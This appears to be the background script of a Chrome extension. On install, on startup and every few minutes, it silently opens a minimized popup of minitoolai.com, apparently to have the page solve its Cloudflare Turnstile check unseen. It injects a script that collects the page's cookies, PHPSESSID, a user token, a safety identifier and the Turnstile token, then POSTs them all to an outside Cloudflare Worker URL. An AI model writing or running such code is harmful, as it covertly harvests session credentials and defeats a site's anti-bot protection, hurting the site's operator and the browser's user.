const WORKER_URL = "https://ultimate-ai-worker.haruyhari930.workers.dev/minitool/activate";

chrome.alarms.create("syncSession", { periodInMinutes: 3.5 });

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "syncSession") {
    syncTokens();
  }
});

chrome.runtime.onMessage.addListener((msg) => {
  if (msg.action === "syncNow") {
    syncTokens();
  }
});

let isSyncing = false;

async function syncTokens() {
  if (isSyncing) return;
  isSyncing = true;
  chrome.storage.local.set({ status: "Syncing..." });
  console.log("Starting silent sync...");
  
  // Open a minimized window to solve Turnstile silently
  chrome.windows.create({
    url: "https://minitoolai.com/gpt-ai/",
    state: "minimized",
    focused: false,
    width: 100,
    height: 100,
    type: "popup"
  }, (win) => {
    const tabId = win.tabs[0].id;
    
    let attempts = 0;
    const interval = setInterval(async () => {
      attempts++;
      if (attempts > 30) { // 30 seconds timeout
        clearInterval(interval);
        chrome.windows.remove(win.id);
        chrome.storage.local.set({ status: "Failed (Timeout)" });
        isSyncing = false;
        return;
      }
      
      try {
        const results = await chrome.scripting.executeScript({
          target: { tabId: tabId },
          func: () => {
            const cookies = document.cookie;
            const phpsessid = cookies.match(/PHPSESSID=([^;]+)/)?.[1] || "";
            let utoken = "", safety_id = "";
            for (let s of document.scripts) {
              const m1 = s.text.match(/var utoken\s*=\s*"([^"]+)"/);
              if (m1) utoken = m1[1];
              const m2 = s.text.match(/var safety_identifier\s*=\s*"([^"]+)"/);
              if (m2) safety_id = m2[1];
            }
            return {
              cft: window.cft,
              phpsessid, utoken, safety_identifier: safety_id,
              cookie: cookies
            };
          }
        });
        
        const data = results[0]?.result;
        if (data && data.cft && data.cft.length > 20 && data.cft !== "error" && data.cft !== "expired") {
          clearInterval(interval);
          
          // Send to Cloudflare Worker
          fetch(WORKER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          }).then(r => r.json()).then(res => {
            console.log("Worker sync result:", res);
            chrome.storage.local.set({ lastSync: Date.now(), status: res.ok ? "Success" : "Failed API" });
          }).catch(err => {
            console.error(err);
            chrome.storage.local.set({ status: "Failed Network" });
          }).finally(() => {
            chrome.windows.remove(win.id);
            isSyncing = false;
          });
        }
      } catch(e) {
        // Tab might be loading or cross-origin errors if redirected
      }
    }, 1000);
  });
}

// Initial sync on install/startup
chrome.runtime.onInstalled.addListener(() => syncTokens());
chrome.runtime.onStartup.addListener(() => syncTokens());
